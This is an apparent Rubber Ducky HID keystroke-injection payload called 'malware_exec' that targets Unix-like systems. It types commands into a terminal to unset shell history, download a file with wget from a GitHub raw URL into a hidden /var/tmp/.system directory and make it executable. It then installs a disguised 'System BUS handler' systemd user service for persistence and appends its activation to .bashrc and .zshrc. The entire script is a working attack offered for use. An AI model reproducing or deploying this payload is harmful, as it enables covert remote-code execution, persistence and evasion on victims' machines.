REM Title: malware_exec
REM Description: malware_exec fetches malware hosted on Internet and executes it on targets system.
REM AUTHOR: drapl0n
REM Version: 1.0
REM Category: Exfiltaration
REM Target: Unix-like operating systems.
REM Attackmodes: HID.

DELAY 2000
CTRL ALT t
DELAY 2000
STRING unset HISTFILE
ENTER
DELAY 100
STRING url=https://raw.githubusercontent.com/drapl0n/temp/main/malware_exec
ENTER
DELAY 200
STRING mkdir -p /var/tmp/.system/ && wget $url -O /var/tmp/.system/sys
ENTER
REM [change delay time below according to file size]
DELAY 5000
STRING chmod +x /var/tmp/.system/sys
ENTER
DELAY 200
STRING mkdir -p ~/.config/systemd/user
ENTER
DELAY 200
STRING echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/sys -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/systemBUS.service
ENTER
DELAY 200
STRING echo -e "ls -a ~/ | grep 'zshrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"systemctl --user enable --now systemBUS.service\" >> ~/.zshrc\nfi\n\nls -a ~/ | grep 'bashrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"systemctl --user enable --now systemBUS.service\" >> ~/.bashrc\nfi" > /tmp/tmmmp
ENTER
DELAY 200
STRING systemctl --user enable --now systemBUS.service
ENTER
DELAY 500
STRING systemctl --user start --now systemBUS.service
ENTER
DELAY 200
STRING chmod +x /tmp/tmmmp && cd ~/ && /tmp/tmmmp && rm /tmp/tmmmp 
ENTER
